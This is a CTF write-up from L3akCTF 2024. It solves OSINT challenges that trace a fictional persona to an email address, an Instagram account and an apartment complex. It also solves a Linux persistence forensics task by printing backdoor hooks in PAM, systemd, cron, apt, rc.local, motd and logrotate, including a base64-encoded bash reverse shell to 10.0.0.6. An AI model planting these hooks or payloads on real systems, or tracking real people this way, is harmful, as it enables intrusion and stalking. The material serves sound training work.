``` L3AK{Th3_g4M1nG_TrA1L_LeD_Y0u_heR3} ```

<br>

## Gameplay-3 - [34 solves]
451
You have to solve Gameplay-2 before you can solve this challenge.

_Authors: Suvoni & 0x157_

In the Discord server, we dive in previous conversation and find the following photo, talking about both guys playing chess online:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_3_0.png" width="70%"/>
</p>

We looked for the **m4rt1nicraft** nick in [chess.com](https://www.chess.com/), the most famous website for playing chess and found [his profile](https://www.chess.com/member/m4rt1nicraft).
On Discord, his mate calls for some sensitive info leak on his chess profile, so we look into wayback machine:

- Chess.com: https://www.chess.com/member/m4rt1nicraft

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_3_0_info.png" width="60%"/>
</p>

On [Wayback](https://web.archive.org/web/20240520023121/https://www.chess.com/member/m4rt1nicraft) we find his email address:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_3_1_mail.png" width="70%"/>
</p>

Using his email on the calendar URL, se can see a public meeting: [https://calendar.google.com/calendar/u/0/embed?src=caravaggioluca599@gmail.com](https://calendar.google.com/calendar/u/0/embed?src=caravaggioluca599@gmail.com). We can also try with his Google user ID to search Google Maps contributions, but there was nothing in there. Here we see the public meeting:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_3_2_cal.png" width="70%"/>
</p>

With the [instagram link](https://www.instagram.com/tf4rc_1n1tr4m_733132/), we can access and see the flag on the public pictures:

- Instagram: https://www.instagram.com/tf4rc_1n1tr4m_733132/

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_3_flag.png" width="70%"/>
</p>

``` L3AK{1NsT4grAm_AcC0uNT_R3Cov3rY!} ```

<br>


## Gameplay-4 - [22 solves]
500
For this challenge, submit the name of the apartment complex in the flag wrapper L3AK{}. All lowercase, no spaces.

Example Flag: L3AK{1337apartmentcomplex}

_Authors: Suvoni & 0x157_

Let's get to the fun part 😉

We can grab some information from previous sources. From instagram post:


_I absolutely love Atwood's Pizza! I had the Lazy Cat specialty pizza with my CTF team and it was delicious!
I took my school's Gold Route bus to get here from campus, although I usually take a different bus route to get from my apartment to campus.
Anyways, I would highly recommend this place to other students living in the area!_

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_0.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_1.png" width="70%"/>
</p>


We searched for [Atwood's Pizza](https://www.google.es/maps/@33.7775399,-84.3871781,3a,75y,140.39h,102.17t/data=!3m6!1e1!3m4!1sJuURJvHRz4F4Cs-CsZLfWQ!2e0!7i16384!8i8192?hl=es&entry=ttu) at Google.

We follow the conversation on Discord, Martini Craft lives near here:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_dis.png" width="70%"/>
</p>

Using Google Lens we see that it Coda building on Atlanta, close to our [Atwood's Pizza](https://www.google.es/maps/@33.7775399,-84.3871781,3a,75y,140.39h,102.17t/data=!3m6!1e1!3m4!1sJuURJvHRz4F4Cs-CsZLfWQ!2e0!7i16384!8i8192?hl=es&entry=ttu). This is the exact [Google Maps location](https://www.google.es/maps/@33.7767032,-84.388816,3a,75y,180.48h,104.95t/data=!3m6!1e1!3m4!1suVB5RB5zUK2w2eh2RFnyOQ!2e0!7i16384!8i8192?hl=es&entry=ttu).

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_coda.png" width="70%"/>
</p>

On the Instagram post it says he uses the Gold line to get to Atwood's Pizza from the Campus, but **uses other lane to go from Campus to his Apartment**. Looking for the Gold Bus line, we find the [following map](https://www.pts.gatech.edu/shuttles/stinger/) that will help us in the task:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/map.png" width="70%"/>
</p>


Next, we collect more data on the Discord:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_comments.png" width="70%"/>
</p>


Time to connect the dots. We search for Subway and Gas stations on Google Map and use the bus lines to connect the dots:

- 🟣 G: Gas Station
- 🟢 S: SubWay
- 🔴 P: Atwood's Pizza
- 🔵 Ph: Where discord photo was taken

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_map.png" width="70%"/>
</p>

Looking to the different options, we tried all the apartments at the right side of the map, we focused too much on the Discord image with the following quote: _"here's a hint, I live relatively close to here 🤫"_, so we spent so much time there with no success.


Ten minutes before the CTF finished, I decided to forget about the discord image "near the Coda building" and looked to the top of the map, the green bus line. Since it says _"There's a gas station across from my place if you need to refuel after your long drive 👍"_ and _"if we get hungry, we can go to the Subway down the street"_, I selected the building in front of the gas station on the **Green Bus campus line** and we got the correct apartment:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/rich_map.png" width="70%"/>
</p>

Building:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_4_flag.png" width="70%"/>
</p>

[Google Map flag appartment](https://www.google.es/maps/place/The+Local+on+14th/@33.7857855,-84.403718,17.78z/data=!4m9!1m2!2m1!1sgas+station!3m5!1s0x88f504f400f6f29d:0x260e8e6779f8925e!8m2!3d33.7865179!4d-84.4023624!16s%2Fg%2F11c459zxtd?hl=es&entry=ttu)

``` L3AK{thelocalon14th} ```

<br>

---

<br>


# Forensic

## HoldOnTight - [68 solves]
298
linux persistence
Hacking is all about persistence

_Author: vivisghost_

nc 35.229.44.203 3666

They provide us with an **/etc** folder. We looked for different persistence techniques I've seen on other pentesting tasks:

- pam.d/sudo 

```bash
cat pam.d/sudo        
#%PAM-1.0

# Set up user limits from /etc/security/limits.conf.
session    required   pam_limits.so

session    required   pam_env.so readenv=1 user_readenv=0
session    required   pam_env.so readenv=1 envfile=/etc/default/locale user_readenv=0

# CantStopWontStop
session optional pam_exec.so /tmp/backdoor.sh

#L#3#a#k#{#5#u#p#3#r#_#5#h#3#1#1#_#u#5#3#r#}
@include common-auth
@include common-account
@include common-session-noninteractive
```

- systemd/system/backdoor.service

```bash
cat systemd/system/backdoor.service
[Unit]
Description=Malware Service Example
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=on-failure
User=root #}r3m1T_dn@_3c1vr35{ka3L

[Install]
WantedBy=multi-user.target
```

- crontab

```bash
cat crontab                      

SHELL=/bin/sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 * * * * root /tm'p/b'ac'kd'oor.sh
#L'3a'k{Cr0n5'_50'_C71'ch3}'
```


- /etc/apt/apt.conf.d

```bash
/etc/apt/apt.conf.d
cat 100holdon    
#TDNha3s0cDdfSW41NzQxMV81aDMxMX0=
DPKG::Post-Invoke {"file=$(echo 'YmFja2Rvb3Iuc2g='|base64 -d); echo 'IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo=' |base64 -d > /tmp/$file;chmod +x /tmp/$file;/tmp/$file";};
```

- init.d

```bash
bash S01stillhere.sh start
L3ak{initd_2_b0075}
```


- rc.local

```bash
cat rc.local 
#!/bin/bash

ENCODED_ArcaneGate_PATH="L3RtcC9iYWNrZG9vci5zaA=="
ArcaneGate_PATH=$(echo "$ENCODED_ArcaneGate_PATH" | base64 --decode)
ArcaneGate_BASE64='IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC42LzEyMzQgMD4mMQo='

# Check if the ArcaneGate script exists, if not, recreate it from the Base64 string
if [ ! -f "$ArcaneGate_PATH" ]; then
    echo "ArcaneGate script not found, recreating..."
    echo "$ArcaneGate_BASE64" | base64 --decode > "$ArcaneGate_PATH"
    chmod +x "$ArcaneGate_PATH"
fi

# The Specter that Steers Your Spirit
## In the shadowed alcoves of ancient libraries where the whispers of the past linger like morning fog,
## there lies a tome, bound not in leather but in the mysteries of the ether itself.
## The first chapter, "The Specter that Steers Your Spirit," reveals how one may
## summon and commune with the ghostly essences that drift through the veils of our world. 
## TDNha3tyY19sMGM0bF8wbl9iMDB0fQ==

# Execute the ArcaneGate script
"$ArcaneGate_PATH"

exit 0
```

- /etc/update-motd.d/00-header

```bash
cat /etc/update-motd.d/00-header

#!/bin/sh
[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
  # Fall back to using the very slow lsb_release utility
  DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

echo '2f746d702f6261636b646f6f722e73682026' | xxd -r -p | bash
# echo '4c33616b7b35683331315f30665f3768335f4434797d0a' | xxd -r -p
```

- logrotate.d/rsyslog

```bash
/var/log/syslog
/var/log/mail.info
/var/log/mail.warn
/var/log/mail.err
/var/log/mail.log
/var/log/daemon.log
/var/log/kern.log
/var/log/auth.log
/var/log/user.log
/var/log/lpr.log
/var/log/cron.log
/var/log/debug
/var/log/messages
{
  rotate 4
  weekly
  missingok
  notifempty
  compress
  delaycompress
  sharedscripts
  postrotate
    /usr/lib/rsyslog/rsyslog-rotate
                # Regular maintenance script version 4c33616b7b3130675f376834375f35683331317d
                $(echo -n '2f746d702f6261636b646f6f722e7368' | xxd -r -p)
  endscript
}
```

The compilation of the file:

1 - L3ak{5up3r_5h311_u53r}

2 - L3ak{53rv1c3_@nd_T1m3r}

3 - L3ak{Cr0n5_50_C71ch3}

4 - L3ak{4p7_In57411_5h311}

5 - L3ak{initd_2_b0075}

6 - L3ak{rc_l0c4l_0n_b00t}

7 - L3ak{5h311_0f_7h3_D4y}

8 - L3ak{10g_7h47_5h311}

We input the flags in the nc listener and we get the final flag:


``` L3AK{C4nt_570p_W0n7_570p_p3rs1st} ```

---

Overall, great CTF, I enjoyed really much. Thanks to the L3ak team for the work and hope next year they manage to organize another CTF. Thanks for reading!

<br>